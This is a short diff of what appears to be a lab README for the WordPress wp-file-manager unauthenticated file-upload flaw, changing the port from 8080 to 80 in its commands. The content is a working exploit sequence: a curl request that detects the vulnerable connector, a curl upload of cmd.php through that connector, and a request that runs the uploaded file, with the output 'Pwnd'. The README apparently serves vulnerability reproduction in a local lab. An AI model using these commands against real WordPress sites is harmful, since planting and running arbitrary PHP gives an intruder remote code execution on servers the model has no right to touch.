@@ -47,7 +47,7 @@ https://www.exploit-db.com/exploits/49178
 
 ## Detect 
 ```
-curl  "http://localhost:8080/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
+curl  "http://localhost:80/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
 
 {"error":["errUnknownCmd"]}
 ```
@@ -56,12 +56,12 @@ curl  "http://localhost:8080/wp-content/plugins/wp-file-manager/lib/php/connecto
 
 ### Upload cmd.php
 ```
-curl -F "cmd=upload" -F "target=l1_Lw"  -F "upload[]=@cmd.php" "http://localhost:8080/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
+curl -F "cmd=upload" -F "target=l1_Lw"  -F "upload[]=@cmd.php" "http://localhost:80/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
 ```
 
 ### Run it
 ```
-curl  "http://localhost:8080/wp-content/plugins/wp-file-manager/lib/files/cmd.php"
+curl  "http://localhost:80/wp-content/plugins/wp-file-manager/lib/files/cmd.php"
 
 Pwnd
 ```
